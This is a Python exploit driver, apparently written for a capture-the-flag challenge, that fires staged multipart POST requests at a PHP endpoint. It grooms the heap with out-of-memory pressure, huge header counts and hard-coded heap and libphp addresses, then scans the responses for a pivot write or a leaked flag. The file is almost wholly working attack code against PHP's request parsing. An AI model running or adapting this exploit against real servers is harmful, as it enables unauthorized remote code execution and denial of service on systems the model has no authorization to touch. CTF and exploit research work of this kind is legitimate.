#!/usr/bin/env python3
"""Bounded live A/B/S/D pressure calibration for the authorized Cloudflare CTF."""

from __future__ import annotations

import argparse
import hashlib
import json
import os
from pathlib import Path
import re
import secrets
import socket
import ssl
import sys
import time


sys.path.insert(0, "/root/bridge/stock")
sys.path.insert(0, "/root/chainetool")

import bridge_single_conn as single
import poison_seed_fire_lab as terminal
import stock_bin64_retained_flush_lab as stock


HOST = "php-rce.cloudflare.app"
PORT = 443
PATH = "/php/index.php"
HEAP = 0x7FC1E1A00000
PREAMBLE = 1_048_437
POST_MAX = 8 * 1024 * 1024
EDGE_MAX = 11 * 1024 * 1024
BRACED_FLAG_RE = re.compile(rb"[A-Za-z0-9_]{2,24}\{[^\r\n}]{4,256}\}")
UUID_RE = re.compile(
    rb"[0-9a-fA-F]{8}-(?:[0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}"
)


def add_preamble(body: bytes) -> bytes:
    return b"z" * (PREAMBLE - 2) + b"\r\n" + body


def build_fire_body(headers: int, *, small_final: bool = False) -> bytes:
    if not 1 <= headers <= 1_200_000:
        raise ValueError("D headers must be in 1..1200000")
    payload = bytearray()
    payload += terminal.multipart_field(b"memshift", b"M" * 40_000)
    for index in range(45):
        name = b"a[" + terminal.large_key(index) + b"][c]"
        payload += terminal.multipart_field(name, b"v")
    final_key = b"z" if small_final else terminal.large_key(45)
    final_name = b"a[" + final_key + b"][c]"
    payload += b"--" + terminal.BOUNDARY + b"\r\n"
    payload += b"X: a\r\n" * headers
    payload += (
        b'Content-Disposition: form-data; name="'
        + final_name
        + b'"\r\n\r\nv\r\n--'
        + terminal.BOUNDARY
        + b"--\r\n"
    )
    return bytes(payload)


def pin(data: bytes) -> dict[str, int | str]:
    return {
        "bytes": len(data),
        "sha256": hashlib.sha256(data).hexdigest(),
    }


def response_entity(raw: bytes) -> bytes:
    header, separator, body = raw.partition(b"\r\n\r\n")
    if not separator:
        return b""
    if b"transfer-encoding: chunked" not in header.lower():
        return body
    decoded = bytearray()
    remaining = body
    try:
        while remaining:
            line, separator, remaining = remaining.partition(b"\r\n")
            if not separator:
                break
            size = int(line.split(b";", 1)[0], 16)
            if size == 0:
                break
            if len(remaining) < size + 2:
                break
            decoded.extend(remaining[:size])
            remaining = remaining[size + 2 :]
    except ValueError:
        return body
    return bytes(decoded)


def classify(raw: bytes, marker: bytes) -> dict[str, object]:
    status_match = re.match(rb"HTTP/1\.[01] (\d{3})", raw)
    tried_match = re.search(rb"tried to allocate (\d+) bytes", raw)
    entity = response_entity(raw)
    marker_offset = entity.find(marker)
    flag_match = BRACED_FLAG_RE.search(entity)
    if marker_offset >= 0 and flag_match is None:
        flag_match = UUID_RE.search(entity[marker_offset + len(marker) :])
    return {
        "status": int(status_match.group(1)) if status_match else 0,
        "response_bytes": len(raw),
        "response_sha256": hashlib.sha256(raw).hexdigest(),
        "oom": b"Allowed memory size" in raw,
        "oom_tried_bytes": int(tried_match.group(1)) if tried_match else None,
        "entity_bytes": len(entity),
        "entity_sha256": hashlib.sha256(entity).hexdigest(),
        "marker": marker_offset >= 0,
        "early_canary": b"PIVOT-" in entity or b"X-P2S:" in raw,
        "flag": flag_match.group(0).decode("latin1") if flag_match else None,
        "preview": entity[:500].decode("latin1", "replace"),
    }


def write_exclusive(path: Path, data: bytes) -> None:
    flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL
    if hasattr(os, "O_NOFOLLOW"):
        flags |= os.O_NOFOLLOW
    descriptor = os.open(path, flags, 0o600)
    try:
        os.write(descriptor, data)
        os.fsync(descriptor)
    finally:
        os.close(descriptor)


def send(
    body: bytes,
    boundary: bytes,
    timeout: float,
    chunked: bool,
    *,
    host: str,
    port: int,
    path: str,
    tls: bool,
) -> bytes:
    sock = socket.create_connection((host, port), timeout=timeout)
    if tls:
        sock = ssl.create_default_context().wrap_socket(sock, server_hostname=host)
    sock.settimeout(timeout)
    framing = (
        b"Transfer-Encoding: chunked\r\n"
        if chunked
        else b"Content-Length: " + str(len(body)).encode("ascii") + b"\r\n"
    )
    head = (
        b"POST " + path.encode("ascii") + b" HTTP/1.1\r\n"
        b"Host: " + host.encode("ascii") + b"\r\n"
        b"User-Agent: cfctf-bounded-d-cal/1\r\n"
        b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
        + framing
        + b"Connection: close\r\n\r\n"
    )
    response = bytearray()
    try:
        sock.sendall(head)
        if chunked:
            view = memoryview(body)
            for offset in range(0, len(body), 65_536):
                piece = view[offset : offset + 65_536]
                sock.sendall(f"{len(piece):x}\r\n".encode("ascii"))
                sock.sendall(piece)
                sock.sendall(b"\r\n")
            sock.sendall(b"0\r\n\r\n")
        else:
            sock.sendall(body)
        while len(response) < 16 * 1024 * 1024:
            try:
                piece = sock.recv(65_536)
            except (TimeoutError, socket.timeout):
                break
            if not piece:
                break
            response.extend(piece)
    finally:
        try:
            sock.close()
        except OSError:
            pass
    return bytes(response)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--s-headers", type=int, default=900_000)
    parser.add_argument("--s-pressure-fields", type=int, default=0)
    parser.add_argument("--s-chunked", action="store_true")
    parser.add_argument("--d-headers", type=int, required=True)
    parser.add_argument("--d-chunked", action="store_true")
    parser.add_argument("--d-small-final", action="store_true")
    parser.add_argument("--only-d", action="store_true")
    parser.add_argument("--delta", type=lambda value: int(value, 0), default=0x3600000)
    parser.add_argument("--block", type=lambda value: int(value, 0), default=0x59400)
    parser.add_argument("--profile", default="official-docker", choices=("official-docker",))
    parser.add_argument("--probe-seed", action="store_true")
    parser.add_argument("--timeout", type=float, default=45.0)
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", type=int, default=PORT)
    parser.add_argument("--path", default=PATH)
    parser.add_argument("--no-tls", action="store_true")
    parser.add_argument("--heap", type=lambda value: int(value, 0), default=HEAP)
    parser.add_argument("--out-dir", required=True, type=Path)
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()

    if args.out_dir.exists():
        parser.error("--out-dir must not already exist")
    args.out_dir.mkdir(mode=0o700, parents=False)

    marker = ("SEEDFIRE-" + secrets.token_hex(3) + "|").encode("ascii")
    libphp = args.heap - args.delta
    profile = terminal.PROFILES[args.profile]

    a_native = single.arm_body()
    b_native = stock.finish_b_multipart(stock.build_b_fields(426_950, 21))
    s_native = terminal.build_seed_body(
        args.heap,
        libphp,
        args.block,
        10,
        marker,
        seeds=1,
        oom_count=0,
        oom_depth=57,
        oom_headers=args.s_headers,
        pressure_fields=args.s_pressure_fields,
        probe=args.probe_seed,
        profile=profile,
        fd_mode="derived-adjacent",
    )
    d_native = build_fire_body(args.d_headers, small_final=args.d_small_final)
    stages = {
        "A": (add_preamble(a_native), single.ARM_BOUNDARY, False),
        "B": (add_preamble(b_native), single.DISC_BOUNDARY, False),
        "S": (add_preamble(s_native), terminal.BOUNDARY, args.s_chunked),
        "D": (add_preamble(d_native), terminal.BOUNDARY, args.d_chunked),
    }
    if args.only_d:
        stages = {"D": stages["D"]}

    for label, (body, _boundary, chunked) in stages.items():
        if chunked:
            if len(body) >= EDGE_MAX:
                raise ValueError(f"{label} exceeds the observed live edge ceiling")
        elif len(body) >= POST_MAX:
            raise ValueError(f"{label} exceeds the 8 MiB Content-Length ceiling")

    receipt: dict[str, object] = {
        "schema": "cfctf/bounded-d-calibration/v1",
        "target": (
            ("http" if args.no_tls else "https")
            + f"://{args.host}:{args.port}{args.path}"
        ),
        "profile": args.profile,
        "heap": hex(args.heap),
        "libphp": hex(libphp),
        "delta": hex(args.delta),
        "block": hex(args.block),
        "s_headers": args.s_headers,
        "s_pressure_fields": args.s_pressure_fields,
        "s_transfer": "chunked" if args.s_chunked else "content-length",
        "d_headers": args.d_headers,
        "d_transfer": "chunked" if args.d_chunked else "content-length",
        "d_final_key": "small-control" if args.d_small_final else "large-sink",
        "probe_seed": args.probe_seed,
        "marker": marker.decode("ascii"),
        "wire": {label: pin(row[0]) for label, row in stages.items()},
        "stages": {},
        "request_count": 0,
        "verdict": "DRY_RUN" if args.dry_run else "NOT_RUN",
    }

    if not args.dry_run:
        for label, (body, boundary, chunked) in stages.items():
            began = time.monotonic()
            raw = send(
                body,
                boundary,
                args.timeout,
                chunked,
                host=args.host,
                port=args.port,
                path=args.path,
                tls=not args.no_tls,
            )
            record = classify(raw, marker)
            record["elapsed_s"] = round(time.monotonic() - began, 3)
            receipt["stages"][label] = record
            receipt["request_count"] = int(receipt["request_count"]) + 1
            write_exclusive(args.out_dir / f"{label}.raw", raw)

            if label == "A" and not (record["status"] == 200 and record["oom"]):
                receipt["verdict"] = "A_GATE_MISS"
                break
            if label == "B" and not (
                record["status"] == 200 and record["oom_tried_bytes"] == 4096
            ):
                receipt["verdict"] = "B_GATE_MISS"
                break
            if label == "S" and not (record["status"] == 200 and record["oom"]):
                receipt["verdict"] = "S_GATE_MISS"
                break
            if label == "D":
                if record["flag"]:
                    receipt["verdict"] = "FLAG_OBSERVED"
                elif record["marker"] or record["early_canary"]:
                    receipt["verdict"] = "PIVOT_WRITE_OBSERVED"
                elif record["oom"]:
                    receipt["verdict"] = "D_OOM_OBSERVED"
                else:
                    receipt["verdict"] = "D_NO_POSITIVE_ORACLE"

    encoded = (json.dumps(receipt, indent=2, sort_keys=True) + "\n").encode()
    write_exclusive(args.out_dir / "receipt.json", encoded)
    print(json.dumps(receipt, indent=2, sort_keys=True))
    return 0 if receipt["verdict"] in {
        "DRY_RUN",
        "FLAG_OBSERVED",
        "PIVOT_WRITE_OBSERVED",
        "D_OOM_OBSERVED",
    } else 2


if __name__ == "__main__":
    raise SystemExit(main())
